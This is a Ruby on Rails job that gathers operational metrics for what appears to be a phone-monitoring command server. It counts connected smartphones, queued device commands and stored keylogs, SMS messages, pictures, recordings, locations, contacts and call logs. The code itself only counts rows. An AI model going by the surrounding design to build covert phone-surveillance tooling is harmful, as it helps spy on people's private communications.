# frozen_string_literal: true

# Periodic job that aggregates metrics from various sources and records
# gauge values for the Prometheus endpoint.
#
# Usage:
#   MetricsCollectionJob.perform_later
class MetricsCollectionJob < ApplicationJob
  queue_as :scheduled

  def perform
    collect_device_metrics
    collect_data_metrics
    collect_connection_metrics
    collect_job_queue_metrics

    MetricsService.set_gauge(:metrics_collection_last_run, Time.current.to_i)
  end

  private

  def collect_device_metrics
    total = Smartphone.count
    online = HeartbeatMonitor.get_all_online_devices.size

    MetricsService.set_gauge(:devices_total, total)
    MetricsService.set_gauge(:devices_online, online)
    MetricsService.set_gauge(:devices_offline, total - online)
  rescue StandardError => e
    Rails.logger.error "[MetricsCollectionJob] Device metrics failed: #{e.message}"
  end

  def collect_data_metrics
    {
      keylogs_total: -> { Keylog.count rescue 0 },
      sms_messages_total: -> { SmsMessage.count },
      pictures_total: -> { Picture.count },
      recordings_total: -> { Recording.count },
      geo_locations_total: -> { GeoLocation.count },
      contacts_total: -> { Contact.count },
      call_logs_total: -> { CallLog.count }
    }.each do |metric, counter|
      MetricsService.set_gauge(metric, counter.call)
    end
  rescue StandardError => e
    Rails.logger.error "[MetricsCollectionJob] Data metrics failed: #{e.message}"
  end

  def collect_connection_metrics
    stats = ConnectionMonitor.statistics
    MetricsService.set_gauge(:ws_connections_total, stats[:total_connections])
    MetricsService.set_gauge(:ws_connections_stale, stats[:stale_count])
    MetricsService.set_gauge(:ws_reconnects_total, stats[:total_reconnects])
  rescue StandardError => e
    Rails.logger.error "[MetricsCollectionJob] Connection metrics failed: #{e.message}"
  end

  def collect_job_queue_metrics
    pending = PendingCommand.where(status: :pending).count
    processing = PendingCommand.where(status: :processing).count

    MetricsService.set_gauge(:commands_pending, pending)
    MetricsService.set_gauge(:commands_processing, processing)
  rescue StandardError => e
    Rails.logger.error "[MetricsCollectionJob] Queue metrics failed: #{e.message}"
  end
end
